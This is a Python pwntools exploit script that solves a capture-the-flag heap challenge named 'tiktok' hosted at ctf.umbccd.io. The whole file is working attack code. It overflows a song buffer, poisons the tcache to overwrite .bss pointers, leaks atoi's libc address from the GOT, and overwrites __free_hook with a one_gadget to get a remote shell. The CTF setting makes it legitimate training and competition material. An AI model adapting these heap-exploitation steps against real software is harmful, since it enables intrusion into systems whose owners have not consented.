from pwn import *
import struct
import time

#Song size:
"""
<directory>: 20 bytes

Animal/animal.txt: 946 bytes
Rainbow/godzilla.txt: 767 bytes
Warrior/pastlive.txt: 829 bytes


Cannibal/blow.txt: 1490 bytes <- unsortedbin size
"""


context.binary = "./tiktok"
context.terminal = "/bin/bash"

sh = remote('ctf.umbccd.io', 4700)
#sh = process('./tiktok')
atoi_offset = 0x40680
onegad_offset = 0x4f322
malloc_hook_offset = 0x3ebc30
free_hook_offset = 0x3ed8e8

#local
#atoi_offset = 0x38a00
#system_offset = 0x44c50

@atexception.register
def handler():
	log.failure(sh.recvall())

def imp(path):
	sh.sendlineafter("Choice: ","1")
	sh.sendline(path)
	sh.recvuntil("like to do today?")

def list(amount, tag):
	sh.sendline("2")
	sh.recvuntil(tag)
	return sh.recv(amount)

def play(id, tag="", amount=0):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.recvuntil(tag)
	s = sh.recv(amount)
	sh.recvuntil("like to do today?")
	return s

def play_overflow(id, length, content):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.sendline(length)
	if len(content) > 0x450:
		print "Error your payload's too long. It is " + str(len(content)) + " bytes."
		exit()
	sh.sendline(content)
	sh.recvuntil("like to do today?")

def delete(id, getsh=0):
	sh.sendlineafter("Choice: ","4")
	sh.sendline(id)
	if getsh == 0:
		sh.recvuntil("like to do today?")


for i in range(0, 11): #ids 1-11 are rainbow-godzilla (767 bytes)
	imp("Rainbow/godzilla.txt")

for i in range(0, 11): #ids 12-22 is a directory (20 bytes)
	imp("Warrior")

for i in range(0, 11): #ids 23-33 is animal-animal (946 bytes)
	imp("Animal/animal.txt")

for i in range(0, 10): #ids 34-43 is Warrior-pastlive (829 bytes)
	imp("Warrior/pastlive.txt")

badfile = "Warrior" + "/"*(0x18-len("Warrior"))
imp(badfile) #Number 44 now has stdin as file descriptor
play("12")
play("13")
play("2") #Reserving song #1 for later use


imp("Warrior") #These will be used in the final tcache poison
imp("Warrior")
play("45")
play("46")

play("23")
play("24")

delete("13")
delete("12")
delete("2")
delete("23")
delete("34")


bss_segment = p64(0x404078) #Song num 1's fd
bss_segment_2 = p64(0x404120) #Song num 4's fd (cuz song 2 and eventually 3 is now gone :()
bss_segment_3 = p64(0x404468) #Song num 19's fd (the first fd that's still intact after clobbering once)
bss_segment_4 = p64(0x4049b0) #Song num 43's Author ptr

atoi_got = p64(0x403fd0)

payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
payload += "C"*760

#payload += bss_segment_4
#payload += "D"*(1736-776-8)
#payload += bss_segment_3

payload += p64(0) + p64(0x3c1) #Song num 45 is now in a 0x3c0 byte chunk
payload += "\x00"*24
payload += p64(0x3c1) #Song num 46 is now in an 0x3c0 byte chunk
payload += "\x00"*48

#play_overflow("44", "-1", "A"*32 + bss_segment + "B"*(32-8) + bss_segment_2 + "C"*776 + bss_segment_4 + "D"*(1736-776-8) + bss_segment_3) #song 1 now has fd 0
#sh.interactive()
play_overflow("44", "-1", payload)

delete("46")
delete("45")
#sh.interactive()

play("14")
play("15") #Song no 1 now has fd 0
#sh.interactive()
#play("24")
play("3")
play("35")
#sh.interactive()

#Gonna clobber the .bss with an allocation. First need to generate the payload
clobber = p64(0x0)
for i in range(0, 11):
	clobber += atoi_got
	clobber += atoi_got
	clobber += "\x00"*(5*8)

#Fix up the end to not corrupt any pointers
clobber += atoi_got
clobber += atoi_got
clobber += "\x00"*(55-16)

play_overflow("1", "767", clobber) #Song num 4's fd is set to 0, and 43's song author pointer points to atoi, which has atoi libc address

#sh.interactive()

atoi_libc = u64(list(6, "15. ").ljust(8, '\x00'))
log.success("Atoi in libc: " + hex(atoi_libc))

#sh.interactive()

libc_base = atoi_libc - atoi_offset
malloc_hook_libc = libc_base + malloc_hook_offset
free_hook_libc = libc_base + free_hook_offset
one_gadget_libc = libc_base + onegad_offset

log.success("libc base: " + hex(libc_base))
log.success("Free hook location: " + hex(free_hook_libc))
log.success("One gadget location: " + hex(one_gadget_libc))

play_overflow("4", "946", "A"*32 + p64(free_hook_libc))
play_overflow("5", "946", "omgplswork")
play_overflow("6", "946", p64(one_gadget_libc) + "\x00"*100)
delete("5", 1)
sh.interactive()